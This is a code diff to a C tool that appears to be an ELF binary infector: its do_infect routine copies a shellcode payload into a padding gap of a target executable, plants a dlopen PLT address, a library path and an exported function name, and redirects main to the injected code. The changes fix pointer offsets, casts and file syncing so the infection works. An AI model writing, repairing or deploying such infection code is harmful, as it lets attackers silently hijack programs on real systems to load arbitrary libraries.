@@ -79,6 +79,7 @@ extern uint8_t SH_CODE_END;
 // static helper functions
 static void print_usage();
 static int open_and_map(char* fname, uint8_t** data, size_t* len);
+static int unmap_and_close(int fd, uint8_t* data, size_t len);
 static int find_arg_main(uint8_t* elf, main_arg_t* res);
 static int find_gap(uint8_t* elf_base, empty_area_t* area);
 static int find_plt(uint8_t* elf_base, char* fun_name, plt_entry_t* plt);
@@ -117,6 +118,18 @@ int open_and_map(char* fname, uint8_t** data, size_t* len) {
 
 	*len = size;
 	return fd;
+}
+
+int unmap_and_close(int fd, uint8_t* data, size_t len) {
+	int success = 0;
+	// sync
+	success |= msync(data, len, MS_SYNC);
+
+	// unmap
+	success |= munmap(data, len);
+		
+	success |= close(fd);
+	return success;
 }
 
 int find_arg_main(uint8_t* elf_base, main_arg_t* res) {
@@ -456,7 +469,7 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	}
 	
 	// copy in the payload
-	cursor_dst = pad_area.fileoffset;
+	cursor_dst = tdata + pad_area.fileoffset;
 	for (cursor = &SH_CODE_START; cursor < &SH_CODE_END; cursor += 1) {
 		*cursor_dst = *cursor;
 		cursor_dst++;
@@ -473,10 +486,10 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	*((uint64_t*)cursor_dst) = (uint64_t)dlopen_plt.vaddr;
 	cursor_dst += sizeof(uint64_t);
 	// #4 library path
-	strcpy(cursor_dst, lib_path);
+	strcpy((char*)cursor_dst, lib_path);
 	cursor_dst += strlen(lib_path);
 	// #5 function name
-	strcpy(cursor_dst, exported_func);
+	strcpy((char*)cursor_dst, exported_func);
 	cursor_dst += strlen(exported_func);
 
 	// put in our new main
@@ -495,11 +508,14 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 			printf("unsupported size\n");
 			return -1;
 		}
-		*((uint32_t*)arg_main.file_ptr) = (((int32_t)pad_area.vaddr) - ((int32_t)arg_main.rip);
+		*((uint32_t*)arg_main.file_ptr) = ((int32_t)pad_area.vaddr) - ((int32_t)(uint64_t)arg_main.rip);
 	}
 
-	// cleanup
-	close(tfd);
+	// cleanup	
+	if (unmap_and_close(tfd, tdata, tdata_len)) {
+		printf("Could not close correctly!\n");
+		return -1;
+	}
 
 	return 0;
 }
@@ -513,6 +529,7 @@ int main(int argc, char** argv) {
 
 	if (do_infect(argv[1], argv[2], argv[3])) {
 		printf("Failed\n");
+		return -1;
 	}
 	printf("Success\n");
 	
